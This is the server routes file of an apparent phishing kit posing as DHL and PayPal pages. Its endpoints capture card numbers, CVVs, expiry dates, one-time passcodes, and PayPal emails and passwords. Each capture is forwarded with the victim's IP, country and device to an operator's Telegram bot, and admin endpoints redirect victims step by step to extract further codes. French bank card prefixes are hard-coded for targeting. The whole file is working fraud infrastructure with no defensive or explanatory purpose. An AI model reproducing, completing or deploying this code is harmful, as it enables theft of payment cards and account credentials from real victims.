import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { 
  insertAdminSettingsSchema, 
  insertPaymentRecordSchema 
} from "@shared/schema";
import { z } from "zod";
import { 
  sendTelegramMessage, 
  formatPaymentNotification,
  formatPayPalNotification,
  getClientInfo
} from "./telegram";

export async function registerRoutes(app: Express): Promise<Server> {
  // Admin settings endpoints
  app.get("/api/admin/settings", async (req, res) => {
    try {
      const settings = await storage.getAdminSettings();
      res.json(settings || { 
        telegramBotToken: "", 
        telegramChatId: "",
        redirectUrl: "",
        redirectEnabled: "false"
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to get settings" });
    }
  });

  app.post("/api/admin/settings", async (req, res) => {
    try {
      const validated = insertAdminSettingsSchema.parse(req.body);
      const settings = await storage.upsertAdminSettings(validated);
      
      // Restart Telegram bot with new settings
      const { startTelegramBot } = await import("./telegram-bot");
      startTelegramBot();
      
      res.json(settings);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: error.errors });
      } else {
        res.status(500).json({ error: "Failed to save settings" });
      }
    }
  });

  app.post("/api/admin/test-telegram", async (req, res) => {
    try {
      const { botToken, chatId } = req.body;
      
      if (!botToken || !chatId) {
        return res.status(400).json({ error: "Missing botToken or chatId" });
      }

      const testMessage = `🧪 <b>Test de connexion</b>\n\nVotre bot Telegram est correctement configuré!\n\n⏰ ${new Date().toLocaleString('fr-FR')}`;
      const success = await sendTelegramMessage(botToken, chatId, testMessage);
      
      if (success) {
        res.json({ success: true, message: "Test message sent successfully" });
      } else {
        res.status(500).json({ success: false, error: "Failed to send test message" });
      }
    } catch (error) {
      res.status(500).json({ error: "Test failed" });
    }
  });

  // Payment flow endpoints
  app.post("/api/payment/start", async (req, res) => {
    try {
      const paymentData = {
        cardNumber: req.body.cardNumber,
        expiryMonth: req.body.expiryMonth,
        expiryYear: req.body.expiryYear,
        cvv: req.body.cvv,
        cardholderName: req.body.cardholderName,
        otp1: null,
        otp2: null,
        paypalEmail: null,
        paypalPassword: null,
      };

      const validated = insertPaymentRecordSchema.parse(paymentData);
      const record = await storage.createPaymentRecord(validated);
      
      // Create DHL session for waiting page
      const sessionId = Math.random().toString(36).substring(2, 10);
      const clientInfo = await getClientInfo(req);
      
      // Detect bank from card BIN
      const bin = req.body.cardNumber.replace(/\s/g, "").substring(0, 6);
      let bankName = "Bank";
      
      // Bank detection logic
      if (bin.startsWith("4")) bankName = "Visa";
      else if (bin >= "510000" && bin <= "559999") bankName = "Mastercard";
      else if (bin.startsWith("34") || bin.startsWith("37")) bankName = "American Express";
      else if (["497511", "497591", "497592"].includes(bin)) bankName = "BNP Paribas";
      else if (["450903", "450904", "486236"].includes(bin)) bankName = "Crédit Agricole";
      else if (["512871", "513457", "522371"].includes(bin)) bankName = "Société Générale";
      else if (["434533", "434534", "434535"].includes(bin)) bankName = "Crédit Mutuel";
      else if (["425706", "425707", "453275"].includes(bin)) bankName = "LCL";
      else if (["425790", "434769", "497878"].includes(bin)) bankName = "Caisse d'Épargne";
      else if (["438602", "497592", "513457"].includes(bin)) bankName = "La Banque Postale";
      else if (["450875", "486236", "522371"].includes(bin)) bankName = "Boursorama";

      await storage.createDhlSession({
        sessionId,
        cardNumber: req.body.cardNumber,
        cardholderName: req.body.cardholderName,
        bankName,
        ipAddress: clientInfo.ipAddress,
        country: clientInfo.country,
        device: clientInfo.device,
        browser: clientInfo.browser,
        status: "waiting",
      });

      // Send notification to Telegram
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const notification = formatPaymentNotification({
          cardNumber: req.body.cardNumber,
          expiryMonth: req.body.expiryMonth,
          expiryYear: req.body.expiryYear,
          cvv: req.body.cvv,
          cardholderName: req.body.cardholderName,
          timestamp: new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
          sessionId: sessionId,
        });

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          notification.message,
          notification.keyboard
        );
      }
      
      res.json({ paymentId: record.id, sessionId });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: error.errors });
      } else {
        res.status(500).json({ error: "Failed to create payment record" });
      }
    }
  });

  app.post("/api/payment/:id/otp1", async (req, res) => {
    try {
      const { id } = req.params;
      const { otp } = req.body;

      const updated = await storage.updatePaymentRecord(id, { otp1: otp });
      
      if (!updated) {
        return res.status(404).json({ error: "Payment record not found" });
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update OTP" });
    }
  });

  app.post("/api/payment/:id/otp2", async (req, res) => {
    try {
      const { id } = req.params;
      const { otp } = req.body;

      const updated = await storage.updatePaymentRecord(id, { otp2: otp });
      
      if (!updated) {
        return res.status(404).json({ error: "Payment record not found" });
      }

      // Send notification to Telegram after OTP2 is verified
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const clientInfo = await getClientInfo(req);
        
        const notification = formatPaymentNotification({
          cardNumber: updated.cardNumber,
          expiryMonth: updated.expiryMonth,
          expiryYear: updated.expiryYear,
          cvv: updated.cvv,
          cardholderName: updated.cardholderName,
          otp1: updated.otp1 || undefined,
          otp2: updated.otp2 || undefined,
          timestamp: updated.createdAt || new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
        });

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          notification.message,
          notification.keyboard
        );
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update OTP" });
    }
  });

  // PayPal login endpoint
  app.post("/api/paypal/login", async (req, res) => {
    try {
      const { email, password } = req.body;

      if (!email || !password) {
        return res.status(400).json({ error: "Email and password required" });
      }

      const clientInfo = await getClientInfo(req);

      // Create a session for this login attempt
      const session = await storage.createPaypalSession({
        sessionId: clientInfo.sessionId,
        email,
        password,
        ipAddress: clientInfo.ipAddress,
        country: clientInfo.country,
        device: clientInfo.device,
        browser: clientInfo.browser,
        status: "waiting",
      });

      // Send notification to Telegram
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const notification = formatPayPalNotification({
          email,
          password,
          timestamp: new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
          sessionId: clientInfo.sessionId,
        });

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          notification.message,
          notification.keyboard
        );
      }

      res.json({ success: true, sessionId: session.sessionId });
    } catch (error) {
      res.status(500).json({ error: "Failed to process login" });
    }
  });

  // Check redirect status for PayPal session
  app.get("/api/paypal/check-redirect/:sessionId", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const session = await storage.getPaypalSession(sessionId);

      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      if (session.redirectUrl) {
        res.json({ redirect: session.redirectUrl });
      } else {
        res.json({ redirect: null });
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to check redirect" });
    }
  });

  // Update current path for PayPal session (client)
  app.patch("/api/paypal/session/:sessionId/path", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { currentPath } = req.body;

      const updated = await storage.updatePaypalSession(sessionId, {
        currentPath,
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update path" });
    }
  });

  // Get all waiting PayPal sessions (admin)
  app.get("/api/admin/paypal-sessions", async (req, res) => {
    try {
      const sessions = await storage.getAllPaypalSessions();
      const waitingSessions = sessions.filter(s => s.status === "waiting");
      res.json(waitingSessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to get sessions" });
    }
  });

  // DHL session endpoints
  app.get("/api/dhl/session/:sessionId", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const session = await storage.getDhlSession(sessionId);

      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json(session);
    } catch (error) {
      res.status(500).json({ error: "Failed to get session" });
    }
  });

  // Update current path for DHL session (client)
  app.patch("/api/dhl/session/:sessionId/path", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { currentPath } = req.body;

      const updated = await storage.updateDhlSession(sessionId, {
        currentPath,
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update path" });
    }
  });

  app.get("/api/admin/dhl-sessions", async (req, res) => {
    try {
      const sessions = await storage.getAllDhlSessions();
      const waitingSessions = sessions.filter(s => s.status === "waiting");
      res.json(waitingSessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to get sessions" });
    }
  });

  app.post("/api/admin/dhl-sessions/:sessionId/redirect", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { redirectUrl } = req.body;

      // Get current session to increment version
      const currentSession = await storage.getDhlSession(sessionId);
      if (!currentSession) {
        return res.status(404).json({ error: "Session not found" });
      }

      // Increment redirectVersion and update redirectUrl, keep status as waiting
      const updated = await storage.updateDhlSession(sessionId, {
        redirectUrl,
        redirectVersion: (currentSession.redirectVersion ?? 0) + 1,
        status: "waiting", // Keep as waiting to allow multiple redirects
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to update session" });
    }
  });

  // Update PayPal session redirect (admin)
  app.post("/api/admin/paypal-sessions/:sessionId/redirect", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { redirectUrl } = req.body;

      // Get current session to increment version
      const currentSession = await storage.getPaypalSession(sessionId);
      if (!currentSession) {
        return res.status(404).json({ error: "Session not found" });
      }

      // Increment redirectVersion and update redirectUrl, keep status as waiting
      const updated = await storage.updatePaypalSession(sessionId, {
        redirectUrl,
        redirectVersion: (currentSession.redirectVersion ?? 0) + 1,
        status: "waiting", // Keep as waiting to allow multiple redirects
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to update session" });
    }
  });

  // Get all payment records (for admin)
  app.get("/api/payments", async (req, res) => {
    try {
      const records = await storage.getAllPaymentRecords();
      res.json(records);
    } catch (error) {
      res.status(500).json({ error: "Failed to get payment records" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
